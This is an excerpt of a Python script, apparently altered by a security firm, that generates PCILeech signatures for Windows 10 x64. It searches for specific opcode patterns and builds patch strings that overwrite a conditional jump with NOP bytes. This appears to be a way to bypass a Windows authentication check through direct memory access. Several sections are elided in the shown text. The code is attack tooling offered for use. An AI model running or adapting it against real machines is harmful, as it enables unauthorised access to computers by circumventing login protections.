...
# This file has been modified by Security Risk Advisors to add Windows 10 support
# and output signatures compatible with PCILeech
...
def dummy_convert_list_int_to_opcodes(value):
    result = ""
    for i in value:
        result = result + padHex(i)
    return result
...
def initialize_Windows_objects():
    ...
    Windows10 = {}
    opcodes1_10_x64 = dummy_convert_opcodes_to_list_int("ff15")
    opcodes2_10_x64 = dummy_convert_opcodes_to_list_int("493bc60f85")

    Windows10["x64"] = [OS(version="Windows10", architecture="x64", SP="",
                            pattern1=[0, opcodes1_10_x64],
                            pattern2=[6, opcodes2_10_x64])]
    OS_list["Windows10"] = Windows10
...
def display_bruteforce_results(bf_results):
    for result in bf_results:
        ...
        print("    PCILeech signature: %s" % (result[1]))
        print("")
    ...
    for OS_version, Windows_object in OS_list.iteritems():
        ...
        for architecture, value in Windows_object.iteritems():
            for target in value:
                ...
                if offsets:
                    signatures = []
                    hexOffsets = [hex(x) for x in offsets]
                    for h in offsets:
                        h2 = (h + target.pattern2["offset"])
                        PCILeechSignature = padHex(h) + "," + dummy_convert_list_int_to_opcodes(target.pattern1["opcodes"]) + "," + padHex(h2) + "," + dummy_convert_list_int_to_opcodes(target.pattern2["opcodes"]) + "," + padHex(h2+3) + "," + "909090909090"
                    results.append([target, PCILeechSignature])
    return results
